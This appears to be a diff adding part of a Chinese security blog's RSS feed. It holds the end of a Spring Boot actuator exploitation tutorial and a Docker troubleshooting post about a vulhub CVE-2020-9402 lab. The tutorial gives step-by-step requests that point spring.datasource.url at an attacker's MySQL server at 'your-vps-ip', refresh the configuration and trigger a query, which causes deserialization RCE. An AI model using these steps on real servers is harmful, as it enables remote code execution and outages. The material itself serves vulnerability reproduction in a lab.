+&lt;p&gt;在脚本&lt;strong&gt;同目录下&lt;/strong&gt;生成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload.ser&lt;/code&gt; 反序列化 payload 文件，供脚本使用。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤三设置-springdatasourceurl-属性&quot;&gt;步骤三：设置 spring.datasource.url 属性&lt;/h5&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;mysql-connector-java 5.x 版本设置&lt;strong&gt;属性值&lt;/strong&gt;为：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;amp;useSSL=false&amp;amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;amp;autoDeserialize=true
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;mysql-connector-java 8.x 版本设置&lt;strong&gt;属性值&lt;/strong&gt;为：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;amp;useSSL=false&amp;amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;amp;autoDeserialize=true
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.datasource.url=对应属性值
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤四刷新配置-1&quot;&gt;步骤四：刷新配置&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
+Content-Type: application/json
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤五触发数据库查询&quot;&gt;步骤五：触发数据库查询&lt;/h5&gt;
+
+&lt;p&gt;尝试访问网站已知的数据库查询的接口，例如： &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/product/list&lt;/code&gt; ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤六恢复正常-jdbc-url&quot;&gt;步骤六：恢复正常 jdbc url&lt;/h5&gt;
+
+&lt;p&gt;反序列化漏洞利用完成后，使用 &lt;strong&gt;步骤三&lt;/strong&gt; 的方法恢复 &lt;strong&gt;步骤一&lt;/strong&gt; 中记录的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring.datasource.url&lt;/code&gt; 的原始 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;value&lt;/code&gt; 值&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞原理-6&quot;&gt;漏洞原理：&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址&lt;/li&gt;
+  &lt;li&gt;refresh 刷新后设置了一个新的 spring.datasource.url 属性值&lt;/li&gt;
+  &lt;li&gt;当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接&lt;/li&gt;
+  &lt;li&gt;然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据&lt;/li&gt;
+  &lt;li&gt;目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;漏洞分析-7&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf&quot;&gt;New-Exploit-Technique-In-Java-Deserialization-Attack&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境-7&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-mysql-jdbc-rce&quot;&gt;repository/springboot-mysql-jdbc-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9097/actuator/env
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;发送完 payload 后触发漏洞：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9097/product/list
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</description>
+        <pubDate>Fri, 25 Sep 2020 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/blog/2020/Spring-boot/</link>
+        <guid isPermaLink="true">/blog/2020/Spring-boot/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>src</category>
+        
+        <category>CVE</category>
+        
+        <category>信息搜集</category>
+        
+        <category>笔记</category>
+        
+      </item>
+    
+      <item>
+        <title>blog: 「排错」：Docker启动vulnhub报错排错</title>
+        <description>&lt;p&gt;最近在做靶场漏洞复现的时候发现了一个由web虚拟机和db虚拟机一起跑起来的联动靶场环境，下载完镜像后总是报错，思前想后都没办法，于是只能自己来解决问题，虽然结果令人大失所望，但是过程还是挺让人有成就感的，就记录了一下。&lt;/p&gt;
+
+&lt;h2 id=&quot;docker启服务&quot;&gt;#docker启服务&lt;/h2&gt;
+&lt;p&gt;进入相对应的靶场环境文件夹下起靶场：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro CVE-2020-9402 % docker-compose up -d
+Creating network &quot;cve-2020-9402_default&quot; with the default driver
+Creating cve-2020-9402_db_1 ... done
+Creating cve-2020-9402_web_1 ... done
+bin4xin@bin4xin'&lt;/span&gt;s MacbookPro CVE-2020-9402 % docker-compose ps
+       Name                      Command               State              Ports            
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------&lt;/span&gt;
+cve-2020-9402_db_1    /entrypoint.sh                   Up      1521/tcp, 5500/tcp, 8080/tcp
+cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Up      0.0.0.0:8000-&amp;gt;8000/tcp 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;我们可以看到对应web服务的端口监听状态：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0.0.0.0:8000-&amp;gt;8000/tcp&lt;/code&gt;，所以我们直接访问试试看：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro CVE-2020-9402 % curl localhost:8000
+curl: (52) Empty reply from server
+bin4xin@bin4xin'&lt;/span&gt;s MacbookPro CVE-2020-9402 % docker-compose ps  
+       Name                      Command               State              Ports            
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------&lt;/span&gt;
+cve-2020-9402_db_1    /entrypoint.sh                   Up      1521/tcp, 5500/tcp, 8080/tcp
+cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Up      0.0.0.0:8000-&amp;gt;8000/tcp 
+
+
+bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro CVE-2020-9402 % curl 127.0.0.1:8000/vuln
+curl: (52) Empty reply from server
+bin4xin@bin4xin'&lt;/span&gt;s MacbookPro CVE-2020-9402 % docker-compose ps       
+       Name                      Command               State              Ports            
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------&lt;/span&gt;
+cve-2020-9402_db_1    /entrypoint.sh                   Up      1521/tcp, 5500/tcp, 8080/tcp
+cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Up      0.0.0.0:8000-&amp;gt;8000/tcp 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;在上面的bash终端代码我们可以看到，我们访问8000端口服务，都是返回&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Empty reply from server&lt;/code&gt;，我就很郁闷了，明明docker显示状态是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Up&lt;/code&gt;状态，怎么访问时服务返回空呢。&lt;/p&gt;
+
+&lt;h2 id=&quot;排错&quot;&gt;#排错&lt;/h2&gt;
+
+&lt;h3 id=&quot;这是一个有脾气的容器&quot;&gt;#这是一个有脾气的容器&lt;/h3&gt;
+&lt;p&gt;还是不甘心，看了一下本地的ip地址，再次访问看看：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro shiro % ifconfig|grep inet                                                  
+	inet 127.0.0.1 netmask 0xff000000 
+	inet6 ::1 prefixlen 128 
+	inet6 fe80::1%lo0 prefixlen 64 scopeid 0x1 
+	inet6 fe80::aede:48ff:fe00:1122%en5 prefixlen 64 scopeid 0x7 
+	inet6 fe80::146d:ed67:817a:e134%en0 prefixlen 64 secured scopeid 0x9 
+	inet 114.97.221.67 netmask 0xfffffe00 broadcast 114.97.221.255
+	inet6 fe80::24e6:3dff:fe1c:7c55%awdl0 prefixlen 64 scopeid 0x10 
+	inet6 fe80::24e6:3dff:fe1c:7c55%llw0 prefixlen 64 scopeid 0x11 
+	inet6 fe80::9a9a:9906:8f8d:5e0%utun0 prefixlen 64 scopeid 0x12 
+	inet6 fe80::8ef2:d44b:f2b0:f37e%utun1 prefixlen 64 scopeid 0x13 
+
+en0: flags=8863&amp;lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&amp;gt; mtu 1500
+	inet 114.97.221.67
+
+bin4xin@bin4xin'&lt;/span&gt;s MacbookPro shiro % curl http://114.97.221.67:8000/vuln
+curl: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Failed to connect to 114.97.221.67 port 8000: Connection refused
+
+bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro shiro % docker-compose ps                  
+       Name                      Command                 State                 Ports            
+------------------------------------------------------------------------------------------------
+cve-2020-9402_db_1    /entrypoint.sh                   Up           1521/tcp, 5500/tcp, 8080/tcp
+cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Restarting 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;好家伙，这次直接web服务重启了，有脾气。没办法，直接把整个环境down掉重启。&lt;/p&gt;
+
+&lt;h3 id=&quot;进容器&quot;&gt;#进容器&lt;/h3&gt;
+&lt;p&gt;这次我想到的办法是直接进容器里面去看看服务到底发生了什么：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker ps
+
+a66976bc6d2b        cve-2020-9402_web      &lt;span class=&quot;s2&quot;&gt;&quot;/docker-entrypoint.…&quot;&lt;/span&gt;   4 seconds ago       Up 3 seconds        0.0.0.0:8000-&amp;gt;8000/tcp         cve-2020-9402_web_1
+fc99758ce428        vulhub/oracle:12c-ee   &lt;span class=&quot;s2&quot;&gt;&quot;/entrypoint.sh&quot;&lt;/span&gt;         5 seconds ago       Up 3 seconds        1521/tcp, 5500/tcp, 8080/tcp   cve-2020-9402_db_1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;我们可以通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker ps&lt;/code&gt;来查看docker镜像&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cve-2020-9402_web&lt;/code&gt;对应的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CONTAINER ID&lt;/code&gt;，通过这个id值进入容器；&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro CVE-2020-9402 % sudo docker exec -it a66976bc6d2b /bin/bash
+root@a66976bc6d2b:/usr/src# 
+root@a66976bc6d2b:/usr/src# ps -ef
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 06:44 ?        00:00:00 /bin/bash /docker-entrypoint.sh python manage.py runserver 0.0.0.0:8000
+root         7     1  0 06:44 ?        00:00:00 bash /usr/local/bin/wait-for-it.sh -t 0 db:1521 -- echo oracle is up
+root        56     0  0 06:45 pts/0    00:00:00 /bin/bash
+root        73     7  0 06:45 ?        00:00:00 sleep 1
+root        74    56  0 06:45 pts/0    00:00:00 ps -ef
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;看了一下，没什么大问题啊，服务该照常启动的都启动了，难道是db服务的问题？就在我疑惑的时候，果然：容器又重启了，我的shell直接掉了，查看一下状态，可不咋地，又restart了，心里苦阿。&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro CVE-2020-9402 % docker ps
+
+CONTAINER ID        IMAGE                  COMMAND                  CREATED             STATUS                         PORTS                          NAMES
+a66976bc6d2b        cve-2020-9402_web      &quot;/docker-entrypoint.…&quot;   2 minutes ago       Restarting (1) 2 seconds ago
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;日志排错-&quot;&gt;#日志排错:-)&lt;/h2&gt;
+&lt;p&gt;排错之前看一下docker的打印日志指南&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;% docker logs &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;
+
+Usage:  docker logs &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;OPTIONS] CONTAINER
+
+Fetch the logs of a container
+
+Options:
+      &lt;span class=&quot;nt&quot;&gt;--details&lt;/span&gt;        Show extra details provided to logs
+  &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--follow&lt;/span&gt;         Follow log output
+      &lt;span class=&quot;nt&quot;&gt;--since&lt;/span&gt; string   Show logs since timestamp &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. 2013-01-02T13:23:37&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; or relative &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. 42m &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;42 minutes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;--tail&lt;/span&gt; string    Number of lines to show from the end of the logs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default &lt;span class=&quot;s2&quot;&gt;&quot;all&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--timestamps&lt;/span&gt;     Show timestamps
+      &lt;span class=&quot;nt&quot;&gt;--until&lt;/span&gt; string   Show logs before a timestamp &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. 2013-01-02T13:23:37&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; or relative &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. 42m &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;42 minutes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;我们可以看到，f参数对应的是log查看的容器id，而我的需求是，对应查看某一个时间段之后的db虚拟机的日志，所以生成命令：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker logs --since 2020-09-11T14:50:00  -f b5731d06d3ea&lt;/code&gt;
+web的日志:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro shiro % docker logs --since 2020-09-11T14:40:00  -f ae715c332e7e
++ cd /usr/src
++ wait-for-it.sh -t 0 db:1521 -- echo '&lt;/span&gt;oracle is up&lt;span class=&quot;s1&quot;&gt;'
+wait-for-it.sh: waiting for db:1521 without a timeout
+wait-for-it.sh: db:1521 is available after 60 seconds
+oracle is up
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;我们可以看到没有任何报错；继续，看下面的报错：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+ python manage.py makemigrations
+Traceback &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;most recent call last&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+  File &lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/lib/python3.6/site-packages/django/db/backends/base/base.py&quot;&lt;/span&gt;, line 220, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;ensure_connection
+    self.connect&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+  File &lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/lib/python3.6/site-packages/django/utils/asyncio.py&quot;&lt;/span&gt;, line 26, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;inner
+    &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;func&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;args, &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;kwargs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  File &lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/lib/python3.6/site-packages/django/db/backends/base/base.py&quot;&lt;/span&gt;, line 197, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;connect
+    self.connection &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; self.get_new_connection&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;conn_params&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  File &lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/lib/python3.6/site-packages/django/utils/asyncio.py&quot;&lt;/span&gt;, line 26, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;inner
+    &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;func&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;args, &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;kwargs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  File &lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/lib/python3.6/site-packages/django/db/backends/oracle/base.py&quot;&lt;/span&gt;, line 232, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;get_new_connection
+    &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;conn_params,
+cx_Oracle.DatabaseError: ORA-12505: TNS:listener does not currently know of SID given &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;connect descriptor
+
+
+The above exception was the direct cause of the following exception:
+
+Traceback &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;most recent call last&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+  File &lt;span class=&quot;s2&quot;&gt;&quot;manage.py&quot;&lt;/span&gt;, line 21, &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;
+    main&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+·中间部分省略
+·中间部分省略
+·中间部分省略
+    &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;conn_params,
+django.db.utils.DatabaseError: ORA-12505: TNS:listener does not currently know of SID given &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;connect descriptor
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;查看报错是db的报错，赶紧看看db虚拟机的日志情况&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker logs --since 2020-09-11T14:40:00  -f b32b16e34b6c&lt;/code&gt;
+db：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access /u01/app/oracle/oradata/orcl: No such file or directory
+No databases found &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /u01/app/oracle/oradata/orcl. About to create a new database instance
+Starting database listener
+
+LSNRCTL &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Linux: Version 12.1.0.2.0 - Production on 11-SEP-2020 06:54:05
+
+Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1991, 2014, Oracle.  All rights reserved.
+
+Starting /u01/app/oracle/product/12.1.0.2/dbhome_1/bin/tnslsnr: please wait...
+
+TNSLSNR &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Linux: Version 12.1.0.2.0 - Production
+System parameter file is /u01/app/oracle/product/12.1.0.2/dbhome_1/network/admin/listener.ora
+Log messages written to /u01/app/oracle/diag/tnslsnr/b32b16e34b6c/listener/alert/log.xml
+Listening on: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;DESCRIPTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ADDRESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PROTOCOL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;tcp&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32b16e34b6c&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1521&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;
+
+Connecting to &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;DESCRIPTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ADDRESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PROTOCOL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32b16e34b6c&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1521&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;
+STATUS of the LISTENER
+&lt;span class=&quot;nt&quot;&gt;------------------------&lt;/span&gt;
+Alias                     LISTENER
+Version                   TNSLSNR &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Linux: Version 12.1.0.2.0 - Production
+Start Date                11-SEP-2020 06:54:05
+Uptime                    0 days 0 hr. 0 min. 0 sec
+Trace Level               off
+Security                  ON: Local OS Authentication
+SNMP                      OFF
+Listener Parameter File   /u01/app/oracle/product/12.1.0.2/dbhome_1/network/admin/listener.ora
+Listener Log File         /u01/app/oracle/diag/tnslsnr/b32b16e34b6c/listener/alert/log.xml
+Listening Endpoints Summary...
+  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;DESCRIPTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ADDRESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PROTOCOL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;tcp&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32b16e34b6c&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1521&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;
+The listener supports no services
+The &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully
+Copying database files
+1% &lt;span class=&quot;nb&quot;&gt;complete
+&lt;/span&gt;3% &lt;span class=&quot;nb&quot;&gt;complete
+&lt;/span&gt;11% &lt;span class=&quot;nb&quot;&gt;complete
+&lt;/span&gt;18% &lt;span class=&quot;nb&quot;&gt;complete&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;数据库服务似乎已经启动起来了，但是数据库文件还在复制过程中：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Copying database files&lt;/code&gt;，那就等待文件复制完成试试看是不是复制文件的行为。&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;100% &lt;span class=&quot;nb&quot;&gt;complete
+&lt;/span&gt;Look at the log file &lt;span class=&quot;s2&quot;&gt;&quot;/u01/app/oracle/cfgtoollogs/dbca/orcl/orcl.log&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;further details.
+
+LSNRCTL &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Linux: Version 12.1.0.2.0 - Production on 11-SEP-2020 07:00:33
+
